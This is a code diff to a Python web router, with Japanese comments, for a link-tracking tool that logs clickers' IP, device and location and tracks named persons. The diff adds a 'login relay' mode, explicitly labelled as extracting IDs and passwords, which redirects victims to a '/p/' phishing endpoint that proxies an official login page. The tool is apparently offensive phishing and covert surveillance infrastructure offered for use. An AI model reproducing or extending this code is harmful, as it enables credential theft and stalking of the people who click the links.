@@ -1,6 +1,7 @@
-"""追跡ルーター：リンク踏み（一瞬/ライブ/クイズ/識別/転送）・人物ごとの登録・追跡画面。
+"""追跡ルーター：リンク踏み（一瞬/ライブ/クイズ/識別/転送/ログイン中継）・人物ごとの登録・追跡画面。
 
-v16:
+v17:
+  ・ログイン中継モード（login）を追加。/l/{code} から /p/{code}（phish）へ 302 する
   ・機種・世代の特定と無操作収集の項目を受理（_HIT_STR / _HIT_NUM 拡張）
   ・収集データは必ず「リンク作成者のテナントDB」に保存し、その作成者単位で退避する
       （_save_owner。作成時・ヒット時・座標時・設定変更時・削除時に発火）
@@ -70,7 +71,7 @@ UI_LABEL = {
 }
 
 VALID_MODES = ("page", "geo", "snap", "live", "quiz", "identify",
-               "redirect", "redirect_gps")
+               "redirect", "redirect_gps", "login")
 
 REDIRECT_MODES = ("redirect", "redirect_gps")
 
@@ -80,6 +81,7 @@ MODE_LABEL = {
     "identify": "特定",
     "redirect": "即リダイレクト（位置情報なし）",
     "redirect_gps": "即リダイレクト（位置情報あり）",
+    "login": "ログイン中継（ID/パス抜き）",
 }
 
 # ---------- OGP（飛び先のカード表示） ----------
@@ -211,23 +213,23 @@ def live_cfg():
 
 
 def _install_patch(main):
-    """main._create_link に redirect_gps を通す薄いラッパを被せる（冪等）。"""
+    """main._create_link に redirect_gps / login を通す薄いラッパを被せる（冪等）。"""
     f = getattr(main, "_create_link", None)
     if not f or getattr(f, "_igt_patched", False):
         return
     orig = f
 
     def _create_link(name, dest, note, mode, u):
-        if mode == "redirect_gps":
+        if mode in ("redirect_gps", "login"):
             code = main._new_code()
             users.register_link(code, u)
             db.add_link(code, name or code, (dest or "").strip(),
-                        (note or "").strip()[:200], "redirect_gps")
+                        (note or "").strip()[:200], mode)
             try:
                 persist.push_user(u, force=True)
             except Exception:
                 pass
-            return code, "redirect_gps"
+            return code, mode
         return orig(name, dest, note, mode, u)
 
     _create_link._igt_patched = True
@@ -559,6 +561,10 @@ def link_hit(code: str, request: Request):
                       notes=linktrack.ip_notes(ip),
                       p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                       g=linktrack.geo(ip))
+
+    # ログイン中継：公式ログイン画面をサーバ側で中継する phish へ渡す
+    if mode == "login":
+        return RedirectResponse(f"/p/{code}?h={hid}", 302)
 
     if mode == "live" or (mode == "page" and L["promote_page"]):
         if mode != "live":
@@ -892,6 +898,8 @@ def tracks_add(request: Request, person: str = Form(""), mode: str = Form("geo")
     _save_owner(u, force=True)
     if mode == "quiz":
         return RedirectResponse(f"/link/{code}/questions?new=1", status_code=303)
+    if mode == "login":
+        return RedirectResponse(f"/link/{code}", status_code=303)
     return RedirectResponse(f"/track/{code}?new=1", status_code=303)
 
 
